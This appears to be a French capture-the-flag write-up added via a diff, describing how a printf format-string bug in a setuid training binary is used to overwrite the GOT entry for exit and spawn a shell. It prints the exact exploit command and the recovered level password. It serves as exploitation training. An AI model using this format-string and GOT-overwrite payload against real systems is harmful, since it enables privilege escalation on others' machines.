@@ -1,0 +1,69 @@
+# Level 5
+## Résumé
+Contrôle chaine de format `printf` => `%n` modifie la `GOT` de exit vers la fonction `o` => appel à la fonction `o` => `system(bin/sh)`.
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
+$> file level5
+level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
+```
+Le home contient un binaire appartenant à l'user `level6` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level6/.pass`.
+
+On récupère le fichier `level5` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level5@10.11.200.192:/home/user/level5/level5 .
+$> r2 level5
+```
+![level5_disassembled](Ressources/level5_disassembled.png)
+
+## Analyse
+### Analyse du programme
+La fonction `main` appel la fonction `n` (`0x080485a0`).
+
+La fonction `n` met en place un buffer de `520` caractères (`; var char *format @ ebp-0x208`).  
+Il est utilisé par `fgets` pour lire depuis l'entrée standard une chaine de caractères de maximum `512 octets` (`mov dword [size], 0x200`).
+Cette chaine de caractères est ensuite passée à la fonction `printf` en chaîne de format. Comme dans le `level3` et `level4`, nous nous retrouvons avec la même faille de sécurité.  
+La fonction `exit(1)` est ensuite appelée, ce qui met fin au programme.
+
+Nous trouvons la fonction `o` qui est présente dans le fichier binaire mais qui n'est pas appelée. Cette fonction fait appel à la fontion `system("/bin/sh"). Le but est donc de réussir à appeler cette fonction à l'aide de la faille de sécurité présente dans `printf`.
+### Mise en place de l'exploitation
+Pour cette exploitation, nous procédons à une exploitation de la `GOT` (Global Offset Table) puisque cette dernière n'est pas protégée contre l'écriture. On pourra ainsi rediriger l'appel à la fonction `exit(1)` vers la fonction `o` pour avoir accès à un shell.  
+Ce tableau `GOT` contient les adresses mémoires des fonctions chargées par le chargeur dynamique, et qui sont donc externes au programme.  
+C'est à travers la `PLT` (Procedure Linkage Table) que l'entrée de la `GOT` correspondante est appelée. La `PLT` permet au chargeur dynamique d'effectuer les recolations (étape permettant de trouver les adresses des fonctions externes et de les référencer dans la GOT) au moment du premier appel de la fonction, et non au moment de chargement du binaire en mémoire.
+
+On retrouve l'adresse de la fonction `exit` dans la `GOT` à l'aide du programme objdump :
+```sh
+$> objdump -R level5
+
+level5:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049814 R_386_GLOB_DAT    __gmon_start__
+08049848 R_386_COPY        stdin
+08049824 R_386_JUMP_SLOT   printf
+08049828 R_386_JUMP_SLOT   _exit
+0804982c R_386_JUMP_SLOT   fgets
+08049830 R_386_JUMP_SLOT   system
+08049834 R_386_JUMP_SLOT   __gmon_start__
+08049838 R_386_JUMP_SLOT   exit
+0804983c R_386_JUMP_SLOT   __libc_start_main
+```
+Il faut donc écrire l'adresse de la fonction `o` (`0x08048404`) à l'adresse mémoire `0x08049838` grâce à la conversion `%n` de `printf`.
+
+Comme dans le `level3`, nous nous déplaçons de 3 `int` en mémoire pour pointer sur le buffer, ce qui donne :
+```sh
+python -c 'print("\x38\x98\x04\x08"+"A"+"%x"*3+"%n\n")'
+```
+Il faut que le nombre de caractères imprimés par `printf` soit égal à `0x08048404`. Moins les 4 caractères utilisé par l'adresse où écrire, il faut mettre dans les conversion `%x` `(0x08048404 - 4) / 3 = 44837941` avec un reste de `1`. Ce qui donne :
+```sh
+python -c 'print("\x38\x98\x04\x08"+"A"+"%.44837941x"*3+"%n\n")'
+```
+## Application
+```sh
+(python -c 'print("\x38\x98\x04\x08"+"A"+"%.44837941x"*3+"%n\n")'; cat -) | ./level5
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
